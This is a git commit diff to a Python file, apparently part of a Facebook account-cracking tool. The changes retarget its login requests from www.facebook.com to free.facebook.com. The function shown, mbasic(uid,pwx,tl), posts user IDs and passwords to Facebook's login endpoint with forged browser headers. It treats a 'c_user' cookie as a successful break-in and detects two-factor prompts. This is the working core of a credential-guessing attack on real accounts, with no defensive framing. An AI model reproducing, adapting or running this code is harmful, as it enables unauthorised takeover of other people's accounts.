10f439881bd75f654c1348482361d2f7b951154c
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-02-15 19:53:03 +0530

    Update w.py

--- w.py
+++ w.py
@@ -1247,7 +1247,7 @@ def mbasic(uid,pwx,tl):
             'lgnrnd': '060759_kOaI',
             'locale': 'en_GB',
             'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/jghjgj',
+            'next': 'https://free.facebook.com/jghjgj',
             'skstamp': '',
             'timezone': '-330',
             'prefill_contact_point': '',
@@ -1269,11 +1269,11 @@ def mbasic(uid,pwx,tl):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
+            'Origin': 'https://free.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'www.facebook.com',
+            'Alt-Used': 'free.facebook.com',
             'Connection': 'keep-alive',
-            'Referer': 'https://www.facebook.com/jghjgj',
+            'Referer': 'https://free.facebook.com/jghjgj',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
@@ -1283,7 +1283,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://free.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
